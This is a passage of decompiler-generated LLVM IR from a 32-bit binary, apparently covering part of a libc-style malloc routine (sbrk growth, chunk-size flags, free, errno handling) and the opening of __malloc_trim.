  store i32 %v2_804a9ac, i32* %ecx.global-to-local, align 4
  %v2_804a9ae = sub i32 %v0_804aa6e, %v2_804a9ac
  %v7_804a9ae = icmp ult i32 %v0_804aa6e, %v2_804a9ac
  %v12_804a9ae = icmp eq i32 %v2_804a9ae, 0
  %v1_804a9b0 = icmp eq i1 %v12_804a9ae, false
  br i1 %v1_804a9b0, label %dec_label_pc_804a9c9, label %dec_label_pc_804a9b2

dec_label_pc_804a9b2:                             ; preds = %dec_label_pc_804a9a2
  %v10_804a9b2 = icmp eq i32 %v0_804aa60, -1
  %v1_804a9b5 = icmp eq i1 %v10_804a9b2, false
  br i1 %v1_804a9b5, label %dec_label_pc_804a9c9, label %dec_label_pc_804a9b7

dec_label_pc_804a9b7:                             ; preds = %dec_label_pc_804a9b2
  store i32 %v0_804a8ee, i32* %ecx.global-to-local, align 4
  %v2_804a9bb = add i32 %v1_804a9a6, %v1_804a8fe
  %v1_804a9be = or i32 %v2_804a9bb, 1
  store i32 %v1_804a9be, i32* %eax.global-to-local, align 4
  store i32 %v1_804a9be, i32* %v2_804a8f7, align 4
  br label %dec_label_pc_804aaf6

dec_label_pc_804a9c9:                             ; preds = %dec_label_pc_804a9b2, %dec_label_pc_804a9a2
  %v0_804a9c9 = load i8, i8* @global_var_8054960.53, align 1
  %v1_804a9c9 = sext i8 %v0_804a9c9 to i32
  store i32 %v1_804a9c9, i32* %eax.global-to-local, align 4
  %v2_804a9ce = urem i8 %v0_804a9c9, 2
  %v3_804a9ce = icmp eq i8 %v2_804a9ce, 0
  br i1 %v3_804a9ce, label %dec_label_pc_804a9e2, label %dec_label_pc_804a9d2

dec_label_pc_804a9d2:                             ; preds = %dec_label_pc_804a9c9
  br i1 %v2_804a8fe, label %dec_label_pc_804a9e2, label %dec_label_pc_804a9d6

dec_label_pc_804a9d6:                             ; preds = %dec_label_pc_804a9d2
  %v1_804a9d8 = icmp eq i1 %v7_804a9ae, false
  br i1 %v1_804a9d8, label %dec_label_pc_804a9e2, label %dec_label_pc_804a9da

dec_label_pc_804a9da:                             ; preds = %dec_label_pc_804a9d6
  %v1_804a9da = and i32 %v1_804a9c9, -2
  %v4_804a9da = trunc i32 %v1_804a9da to i8
  store i32 %v1_804a9da, i32* %eax.global-to-local, align 4
  store i8 %v4_804a9da, i8* @global_var_8054960.53, align 32
  br label %dec_label_pc_804a9e2

dec_label_pc_804a9e2:                             ; preds = %dec_label_pc_804a9d6, %dec_label_pc_804a9d2, %dec_label_pc_804a9c9, %dec_label_pc_804a9da
  %v0_804a9e2 = phi i8 [ %v0_804a9c9, %dec_label_pc_804a9d6 ], [ %v0_804a9c9, %dec_label_pc_804a9d2 ], [ %v0_804a9c9, %dec_label_pc_804a9c9 ], [ %v4_804a9da, %dec_label_pc_804a9da ]
  %v1_804a9e2 = urem i8 %v0_804a9e2, 2
  %v2_804a9e2 = icmp eq i8 %v1_804a9e2, 0
  br i1 %v2_804a9e2, label %dec_label_pc_804aa60, label %dec_label_pc_804a9eb

dec_label_pc_804a9eb:                             ; preds = %dec_label_pc_804a9e2
  br i1 %v2_804a8fe, label %dec_label_pc_804a9f9, label %dec_label_pc_804a9ef

dec_label_pc_804a9ef:                             ; preds = %dec_label_pc_804a9eb
  store i32 %v2_804a9ae, i32* %eax.global-to-local, align 4
  %v2_804a9f3 = add i32 %v2_804a9a6, %v2_804a9ae
  store i32 %v2_804a9f3, i32* @global_var_8054968.50, align 8
  br label %dec_label_pc_804a9f9

dec_label_pc_804a9f9:                             ; preds = %dec_label_pc_804a9eb, %dec_label_pc_804a9ef
  %v1_804a9fb = urem i32 %v0_804aa6e, 8
  %v2_804a9fb = icmp eq i32 %v1_804a9fb, 0
  store i32 %v1_804a9fb, i32* %edx.global-to-local, align 4
  %v1_804a9fe = icmp eq i1 %v2_804a9fb, false
  br i1 %v1_804a9fe, label %dec_label_pc_804aa06, label %dec_label_pc_804aa00

dec_label_pc_804aa00:                             ; preds = %dec_label_pc_804a9f9
  store i32 %v0_804aa6e, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804aa10

dec_label_pc_804aa06:                             ; preds = %dec_label_pc_804a9f9
  %v2_804aa0b = sub nsw i32 8, %v1_804a9fb
  store i32 %v2_804aa0b, i32* %eax.global-to-local, align 4
  %v2_804aa0d = add i32 %v2_804aa0b, %v0_804aa6e
  store i32 %v2_804aa0d, i32* @edi, align 4
  br label %dec_label_pc_804aa10

dec_label_pc_804aa10:                             ; preds = %dec_label_pc_804aa00, %dec_label_pc_804aa06
  %v0_804aa1d = phi i32 [ 0, %dec_label_pc_804aa00 ], [ %v2_804aa0b, %dec_label_pc_804aa06 ]
  %v2_804aa10 = add i32 %v1_804a9a6, %v0_804aa6e
  %v2_804aa1d = add i32 %v0_804aa1d, %v1_804a8fe
  store i32 %v2_804aa1d, i32* %ecx.global-to-local, align 4
  %v2_804aa20 = add i32 %v2_804aa1d, %v2_804aa10
  store i32 %v2_804aa20, i32* %edx.global-to-local, align 4
  %v2_804aa22 = add i32 %v2_804aa20, %v1_804a810
  %v5_804aa25 = and i32 %v2_804aa22, %v1_804a920
  %v2_804aa2c = sub i32 %v5_804aa25, %v2_804aa20
  store i32 %v2_804aa2c, i32* %eax.global-to-local, align 4
  %v2_804aa2e = add i32 %v2_804aa2c, %v2_804aa1d
  store i32 %v2_804aa2e, i32* @esi, align 4
  store i32 %v2_804aa2e, i32* %stack_var_-92, align 4
  %v1_804aa32 = call i32 @__GI_sbrk(i32 %v2_804aa2e)
  store i32 %v1_804aa32, i32* %eax.global-to-local, align 4
  %v10_804aa3a = icmp eq i32 %v1_804aa32, -1
  store i32 %v1_804aa32, i32* %edx.global-to-local, align 4
  %v1_804aa3f = icmp eq i1 %v10_804aa3a, false
  br i1 %v1_804aa3f, label %dec_label_pc_804aa4f, label %dec_label_pc_804aa41

dec_label_pc_804aa41:                             ; preds = %dec_label_pc_804aa10
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804aa46 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804aa46, i32* %eax.global-to-local, align 4
  store i32 %v1_804aa46, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804aa83

dec_label_pc_804aa4f:                             ; preds = %dec_label_pc_804aa10
  %v1_804aa4f = load i32, i32* @ebx, align 4
  %v7_804aa4f = icmp ult i32 %v1_804aa32, %v1_804aa4f
  %v1_804aa51 = icmp eq i1 %v7_804aa4f, false
  br i1 %v1_804aa51, label %dec_label_pc_804aa88, label %dec_label_pc_804aa53

dec_label_pc_804aa53:                             ; preds = %dec_label_pc_804aa4f
  %v0_804aa53 = load i8, i8* @global_var_8054960.53, align 1
  %v2_804aa53 = and i8 %v0_804aa53, -2
  store i8 %v2_804aa53, i8* @global_var_8054960.53, align 32
  store i32 %v2_804aa10, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804aa67

dec_label_pc_804aa60:                             ; preds = %dec_label_pc_804a9e2
  %v10_804aa60 = icmp eq i32 %v0_804aa60, -1
  br i1 %v10_804aa60, label %dec_label_pc_804aa6b, label %dec_label_pc_804aa65

dec_label_pc_804aa65:                             ; preds = %dec_label_pc_804aa60
  store i32 %v0_804aa6e, i32* @edi, align 4
  br label %dec_label_pc_804aa67

dec_label_pc_804aa67:                             ; preds = %dec_label_pc_804aa53, %dec_label_pc_804aa65
  %v0_804aa8847 = phi i32 [ %v2_804aa10, %dec_label_pc_804aa53 ], [ %v0_804aa60, %dec_label_pc_804aa65 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804aa88

dec_label_pc_804aa6b:                             ; preds = %dec_label_pc_804aa60
  store i32 %v0_804aa6e, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804aa72 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804aa72, i32* %edx.global-to-local, align 4
  %v1_804aa79 = load i32, i32* @ebx, align 4
  %v2_804aa79 = sub i32 %v1_804aa72, %v1_804aa79
  %v1_804aa7b = load i32, i32* @esi, align 4
  %v2_804aa7b = sub i32 %v2_804aa79, %v1_804aa7b
  store i32 %v2_804aa7b, i32* %eax.global-to-local, align 4
  %v0_804aa7d = load i32, i32* @global_var_8054968.50, align 8
  %v2_804aa7d = add i32 %v0_804aa7d, %v2_804aa7b
  store i32 %v2_804aa7d, i32* @global_var_8054968.50, align 8
  br label %dec_label_pc_804aa83

dec_label_pc_804aa83:                             ; preds = %dec_label_pc_804aa41, %dec_label_pc_804aa6b
  %v0_804aa8846 = phi i32 [ %v1_804aa46, %dec_label_pc_804aa41 ], [ %v1_804aa72, %dec_label_pc_804aa6b ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804aa88

dec_label_pc_804aa88:                             ; preds = %dec_label_pc_804aa4f, %dec_label_pc_804aa67, %dec_label_pc_804aa83
  %v0_804aa8d = phi i32 [ %v1_804aa32, %dec_label_pc_804aa4f ], [ %v0_804aa8847, %dec_label_pc_804aa67 ], [ %v0_804aa8846, %dec_label_pc_804aa83 ]
  %v10_804aa88 = icmp eq i32 %v0_804aa8d, -1
  br i1 %v10_804aa88, label %dec_label_pc_804aaf6, label %dec_label_pc_804aa8d

dec_label_pc_804aa8d:                             ; preds = %dec_label_pc_804aa88
  %v1_804aa8d = load i32, i32* @edi, align 4
  %v2_804aa8d = sub i32 %v0_804aa8d, %v1_804aa8d
  store i32 %v2_804aa8d, i32* %edx.global-to-local, align 4
  %v1_804aa8f = load i32, i32* @esi, align 4
  %v2_804aa8f = add i32 %v1_804aa8f, %v2_804aa8d
  %v1_804aa92 = or i32 %v2_804aa8f, 1
  store i32 %v1_804aa92, i32* %eax.global-to-local, align 4
  store i32 %v1_804aa8d, i32* @global_var_805462c.38, align 4
  %v2_804aa9b = add i32 %v1_804aa8d, 4
  %v3_804aa9b = inttoptr i32 %v2_804aa9b to i32*
  store i32 %v1_804aa92, i32* %v3_804aa9b, align 4
  %v0_804aa9e = load i32, i32* @global_var_8054968.50, align 8
  %v1_804aa9e = load i32, i32* @esi, align 4
  %v2_804aa9e = add i32 %v1_804aa9e, %v0_804aa9e
  store i32 %v2_804aa9e, i32* @global_var_8054968.50, align 8
  br i1 %v2_804a8fe, label %dec_label_pc_804aaf6, label %dec_label_pc_804aaa8

dec_label_pc_804aaa8:                             ; preds = %dec_label_pc_804aa8d
  store i32 %v0_804a8ee, i32* %ecx.global-to-local, align 4
  %v1_804aaac = add i32 %v1_804a8fe, -12
  %v1_804aaaf = and i32 %v1_804aaac, -8
  store i32 %v1_804aaaf, i32* %eax.global-to-local, align 4
  %v1_804aab4 = or i32 %v1_804aaaf, 1
  store i32 %v1_804aab4, i32* %edx.global-to-local, align 4
  %v5_804aab7 = icmp ult i32 %v1_804aaaf, 15
  store i32 %v1_804aab4, i32* %v2_804a8f7, align 4
  %v0_804aabd = load i32, i32* %ecx.global-to-local, align 4
  %v1_804aabd = load i32, i32* %eax.global-to-local, align 4
  %v2_804aabd = add i32 %v0_804aabd, 4
  %v3_804aabd = add i32 %v2_804aabd, %v1_804aabd
  %v4_804aabd = inttoptr i32 %v3_804aabd to i32*
  store i32 5, i32* %v4_804aabd, align 4
  %v0_804aac5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804aac5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aac5 = add i32 %v0_804aac5, 8
  %v3_804aac5 = add i32 %v2_804aac5, %v1_804aac5
  %v4_804aac5 = inttoptr i32 %v3_804aac5 to i32*
  store i32 5, i32* %v4_804aac5, align 4
  br i1 %v5_804aab7, label %dec_label_pc_804aaf6, label %dec_label_pc_804aacf

dec_label_pc_804aacf:                             ; preds = %dec_label_pc_804aaa8
  %v0_804aacf = load i32, i32* @global_var_8054944.54, align 4
  store i32 %v0_804aacf, i32* @ebx, align 4
  %v0_804aad5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804aada = add i32 %v0_804aad5, 8
  store i32 %v1_804aada, i32* %eax.global-to-local, align 4
  store i32 %v1_804aada, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8054944.54, align 4
  %v1_804aae8 = call i32 @free(i32 %v1_804aada)
  store i32 %v1_804aae8, i32* %eax.global-to-local, align 4
  %v0_804aaf0 = load i32, i32* @ebx, align 4
  store i32 %v0_804aaf0, i32* @global_var_8054944.54, align 4
  br label %dec_label_pc_804aaf6

dec_label_pc_804aaf6:                             ; preds = %dec_label_pc_804aaa8, %dec_label_pc_804aa8d, %dec_label_pc_804aa88, %dec_label_pc_804a9b7, %dec_label_pc_804aacf
  %v0_804aaf6 = load i32, i32* @global_var_8054968.50, align 8
  %v0_804aafb = load i32, i32* @global_var_805496c.55, align 4
  %v0_804ab07 = load i32, i32* @global_var_805462c.38, align 4
  store i32 %v0_804ab07, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_804aaf6, %v0_804aafb
  %v5_804ab0d = select i1 %tmp89, i32 %v0_804aafb, i32 %v0_804aaf6
  store i32 %v5_804ab0d, i32* @edx, align 4
  %v1_804ab10 = load i32, i32* @global_var_8054964.49, align 4
  %v2_804ab10 = add i32 %v1_804ab10, %v0_804aaf6
  store i32 %v5_804ab0d, i32* @global_var_805496c.55, align 4
  %v1_804ab1c = load i32, i32* @global_var_8054974.51, align 4
  %tmp90 = icmp ule i32 %v2_804ab10, %v1_804ab1c
  %v5_804ab22 = select i1 %tmp90, i32 %v1_804ab1c, i32 %v2_804ab10
  store i32 %v5_804ab22, i32* %eax.global-to-local, align 4
  store i32 %v5_804ab22, i32* @global_var_8054974.51, align 4
  %v1_804ab2e = add i32 %v0_804ab07, 4
  %v2_804ab2e = inttoptr i32 %v1_804ab2e to i32*
  %v3_804ab2e = load i32, i32* %v2_804ab2e, align 4
  %v1_804ab31 = and i32 %v3_804ab2e, -4
  store i32 %v1_804ab31, i32* @ecx, align 4
  %v10_804ab34 = icmp ult i32 %v1_804ab31, %v1_804a7ae
  br i1 %v10_804ab34, label %dec_label_pc_804abb4, label %dec_label_pc_804ab3a

dec_label_pc_804ab3a:                             ; preds = %dec_label_pc_804aaf6
  store i32 %v1_804a836, i32* %esi.global-to-local, align 4
  %v2_804ab40 = sub i32 %v1_804ab31, %v1_804a836
  store i32 %v2_804ab40, i32* %ecx.global-to-local, align 4
  %v2_804ab42 = add i32 %v0_804ab07, %v1_804a836
  store i32 %v2_804ab42, i32* @edx, align 4
  %v1_804ab45 = or i32 %v1_804a836, 1
  store i32 %v1_804ab45, i32* %eax.global-to-local, align 4
  store i32 %v2_804ab42, i32* @global_var_805462c.38, align 4
  store i32 %v1_804ab45, i32* %v2_804ab2e, align 4
  %v0_804ab51.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ab51

dec_label_pc_804ab51:                             ; preds = %dec_label_pc_804a7bc, %dec_label_pc_804ab3a
  %v0_804ab51 = phi i32 [ %v5_804a7cf, %dec_label_pc_804a7bc ], [ %v0_804ab51.pre, %dec_label_pc_804ab3a ]
  %v1_804ab51 = or i32 %v0_804ab51, 1
  store i32 %v1_804ab51, i32* @ecx, align 4
  %v0_804ab54 = load i32, i32* @ebx, align 4
  %v1_804ab54 = add i32 %v0_804ab54, 8
  store i32 %v1_804ab54, i32* %ebx.global-to-local, align 4
  %v1_804ab57 = load i32, i32* @edx, align 4
  %v2_804ab57 = add i32 %v1_804ab57, 4
  %v3_804ab57 = inttoptr i32 %v2_804ab57 to i32*
  store i32 %v1_804ab51, i32* %v3_804ab57, align 4
  br label %dec_label_pc_804abc1

dec_label_pc_804ab5c:                             ; preds = %dec_label_pc_804a56e
  %v5_804ab62 = sub i32 %v1_804a551, %v1_804a836
  store i32 %v5_804ab62, i32* %eax.global-to-local, align 4
  %v2_804ab66 = add i32 %v0_804a61c113, %v1_804a836
  store i32 %v2_804ab66, i32* @edx, align 4
  %v1_804ab6a = or i32 %v1_804a836, 1
  store i32 %v2_804ab66, i32* @global_var_8054630.39, align 16
  store i32 %v1_804ab6a, i32* %v2_804a54b, align 4
  %v0_804ab76 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ab78 = or i32 %v0_804ab76, 1
  store i32 %v1_804ab78, i32* @ecx, align 4
  %v0_804ab7b = load i32, i32* @edx, align 4
  store i32 %v0_804ab7b, i32* @global_var_805463c.56, align 4
  store i32 %v0_804ab7b, i32* @global_var_8054640.41, align 64
  %v1_804ab87 = add i32 %v0_804ab7b, 8
  %v2_804ab87 = inttoptr i32 %v1_804ab87 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804ab87, align 4
  %v0_804ab8e = load i32, i32* @edx, align 4
  %v1_804ab8e = add i32 %v0_804ab8e, 12
  %v2_804ab8e = inttoptr i32 %v1_804ab8e to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804ab8e, align 4
  %v0_804ab95 = load i32, i32* @ecx, align 4
  %v1_804ab95 = load i32, i32* @edx, align 4
  %v2_804ab95 = add i32 %v1_804ab95, 4
  %v3_804ab95 = inttoptr i32 %v2_804ab95 to i32*
  store i32 %v0_804ab95, i32* %v3_804ab95, align 4
  %v0_804ab98 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ab98 = load i32, i32* @edx, align 4
  %v3_804ab98 = add i32 %v1_804ab98, %v0_804ab98
  %v4_804ab98 = inttoptr i32 %v3_804ab98 to i32*
  store i32 %v0_804ab98, i32* %v4_804ab98, align 4
  br label %dec_label_pc_804aba6

dec_label_pc_804ab9d:                             ; preds = %dec_label_pc_804a57d
  store i32 %v1_804a836, i32* %ebx.global-to-local, align 4
  %v0_804aba1 = load i32, i32* @ebp, align 4
  %v2_804aba1 = or i32 %v1_804a836, 4
  %v3_804aba1 = add i32 %v0_804aba1, %v2_804aba1
  %v4_804aba1 = inttoptr i32 %v3_804aba1 to i32*
  %v5_804aba1 = load i32, i32* %v4_804aba1, align 4
  %v6_804aba1 = or i32 %v5_804aba1, 1
  store i32 %v6_804aba1, i32* %v4_804aba1, align 4
  br label %dec_label_pc_804aba6

dec_label_pc_804aba6:                             ; preds = %dec_label_pc_804ab5c, %dec_label_pc_804ab9d
  %v0_804aba6 = load i32, i32* @ebp, align 4
  %v1_804aba6 = add i32 %v0_804aba6, 8
  store i32 %v1_804aba6, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804abc1

dec_label_pc_804abab:                             ; preds = %dec_label_pc_804a66d
  %v1_804abab = load i32, i32* @ebx, align 4
  %v2_804abab = add i32 %v0_804a679, 4
  %v3_804abab = add i32 %v2_804abab, %v1_804abab
  %v4_804abab = inttoptr i32 %v3_804abab to i32*
  %v5_804abab = load i32, i32* %v4_804abab, align 4
  %v6_804abab = or i32 %v5_804abab, 1
  store i32 %v6_804abab, i32* %v4_804abab, align 4
  br label %dec_label_pc_804abb0

dec_label_pc_804abb0:                             ; preds = %dec_label_pc_804a685, %dec_label_pc_804abab
  %v0_804abb0 = load i32, i32* @ecx, align 4
  store i32 %v0_804abb0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804abc1

dec_label_pc_804abb4:                             ; preds = %dec_label_pc_804a957, %dec_label_pc_804aaf6, %dec_label_pc_804a999, %dec_label_pc_804a96f
  %v0_804abb4 = load i32, i32* %stack_var_-92, align 4
  %v1_804abb4 = call i32 @__errno_location(i32 %v0_804abb4)
  store i32 %v1_804abb4, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804abbb = inttoptr i32 %v1_804abb4 to i32*
  store i32 12, i32* %v1_804abbb, align 4
  br label %dec_label_pc_804abc1

dec_label_pc_804abc1:                             ; preds = %dec_label_pc_804abb0, %dec_label_pc_804aba6, %dec_label_pc_804ab51, %dec_label_pc_804a7e7, %dec_label_pc_804a799, %dec_label_pc_804a518, %dec_label_pc_804abb4
  store i32 %v2_804a44f, i32* @eax, align 4
  store i32 %v2_804a44f, i32* %stack_var_-92, align 4
  %v2_804abca = call i32 @__pthread_return_void(i32 %v2_804a44f, i32 1)
  store i32 %v2_804abca, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804abd2

dec_label_pc_804abd2:                             ; preds = %dec_label_pc_804a46d, %dec_label_pc_804abc1
  %v0_804abd5 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804abd5, i32* %eax.global-to-local, align 4
  %v2_804abd7 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804abd7, i32* @ebx, align 4
  store i32 %v0_804a43c, i32* @esi, align 4
  store i32 %v0_804a43b, i32* @edi, align 4
  store i32 %v0_804a43a, i32* @ebp, align 4
  ret i32 %v0_804abd5

; uselistorder directives
  uselistorder i32 %v0_804ab98, { 1, 0 }
  uselistorder i32 %v1_804ab1c, { 1, 0 }
  uselistorder i32 %v2_804ab10, { 1, 0 }
  uselistorder i32 %v0_804aafb, { 1, 0 }
  uselistorder i32 %v0_804aaf6, { 0, 2, 1 }
  uselistorder i32 %v1_804aa8d, { 1, 0, 2 }
  uselistorder i32 %v0_804aa8d, { 1, 0 }
  uselistorder i32 %v2_804aa7b, { 1, 0 }
  uselistorder i32 %v1_804aa32, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_804aa20, { 1, 0, 2 }
  uselistorder i32 %v2_804aa10, { 1, 2, 0 }
  uselistorder i32 %v2_804aa0b, { 1, 0, 2 }
  uselistorder i32 %v1_804a9fb, { 2, 1, 0 }
  uselistorder i8 %v0_804a9c9, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_804a9ac, { 1, 0, 2 }
  uselistorder i32 %v0_804aa6e, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_804aa60, { 2, 0, 1 }
  uselistorder i32 %v8_804a97c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_804a962, { 1, 0, 2 }
  uselistorder i32 %v3_804a962, { 1, 0 }
  uselistorder i32 %v1_804a930, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804a924, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804a920, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_804a90e, { 1, 0 }
  uselistorder i32 %v1_804a8fe, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_804a8ee, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_804a8d7, { 1, 0 }
  uselistorder i32 %v2_804a8cb, { 1, 0 }
  uselistorder i32 %v2_804a8bb, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804a89f, { 1, 2, 0 }
  uselistorder i32 %v1_804a89f, { 1, 0, 2 }
  uselistorder i32 %v1_804a89e, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_804a898, { 1, 0 }
  uselistorder i32 %v2_804a876, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804a86a, { 2, 1, 0 }
  uselistorder i32 %v8_804a855, { 4, 3, 2, 1, 5, 0, 6 }
  uselistorder i32 %v2_804a83c, { 1, 0, 2 }
  uselistorder i32 %v0_804a7df, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_804a7ae, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804a7a1, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_804a787, { 1, 0, 2 }
  uselistorder i32 %v1_804a721, { 1, 0 }
  uselistorder i32 %v3_804a716, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_804a710, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_804a70d12, { 1, 0 }
  uselistorder i32 %v2_804a702, { 1, 0 }
  uselistorder i32 %v1_804a6e6, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804a6e2, { 2, 1, 0 }
  uselistorder i32 %v1_804a6de, { 1, 0 }
  uselistorder i32 %v1_804a6d9, { 2, 1, 0 }
  uselistorder i32 %v2_804a6c8, { 1, 0 }
  uselistorder i32 %v1_804a6c5, { 1, 2, 0, 3 }
  uselistorder i32 %v4_804a663, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_804a6ae, { 1, 0 }
  uselistorder i32 %v0_804a679, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804a64f, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804a61c, { 0, 2, 1 }
  uselistorder i32 %v2_804a600, { 1, 0 }
  uselistorder i32 %v1_804a5f6, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804a5f1.lcssa, { 1, 0 }
  uselistorder i32 %v3_804a5e1, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804a5d8, { 1, 0, 2 }
  uselistorder i32 %v3_804a5bb, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_804a5b4, { 1, 0, 2 }
  uselistorder i32 %v2_804a59c, { 2, 1, 0 }
  uselistorder i32 %v0_804a588, { 2, 1, 3, 0 }
  uselistorder i32 %v3_804a54e, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804a61c113, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804a61c107, { 1, 0, 2 }
  uselistorder i32 %v3_804a4fb, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804a4ed, { 2, 1, 0 }
  uselistorder i32 %v2_804a4c8, { 2, 1, 0 }
  uselistorder i8 %v0_804a496, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_804a836, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_804a47f, { 1, 2, 0 }
  uselistorder i32 %v0_804a468, { 1, 0 }
  uselistorder i32 %v2_804a44f, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 1, 12, 14, 15, 16, 17, 18, 0, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_8054960.53, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134563380, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_8054640.41, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805462c.38 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_804abd2, { 1, 0 }
  uselistorder label %dec_label_pc_804abc1, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804abb4, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804abb0, { 1, 0 }
  uselistorder label %dec_label_pc_804aba6, { 1, 0 }
  uselistorder label %dec_label_pc_804ab51, { 1, 0 }
  uselistorder label %dec_label_pc_804aaf6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804aa88, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804aa83, { 1, 0 }
  uselistorder label %dec_label_pc_804aa67, { 1, 0 }
  uselistorder label %dec_label_pc_804aa10, { 1, 0 }
  uselistorder label %dec_label_pc_804a9f9, { 1, 0 }
  uselistorder label %dec_label_pc_804a9e2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a999, { 1, 0 }
  uselistorder label %dec_label_pc_804a957, { 1, 0 }
  uselistorder label %dec_label_pc_804a8ee, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804a88d, { 1, 0 }
  uselistorder label %dec_label_pc_804a7a1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804a799, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804a70d, { 1, 0 }
  uselistorder label %dec_label_pc_804a712.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804a6e6, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a66d, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_804a5f4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804a5dd, { 1, 0 }
  uselistorder label %dec_label_pc_804a54b, { 1, 0 }
  uselistorder label %dec_label_pc_804a61c.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804a518, { 1, 0 }
  uselistorder label %dec_label_pc_804a496, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_804abdd = load i32, i32* @edx, align 4
  store i32 %v0_804abdd, i32* %ebp.global-to-local, align 4
  %v0_804abe0 = load i32, i32* @esi, align 4
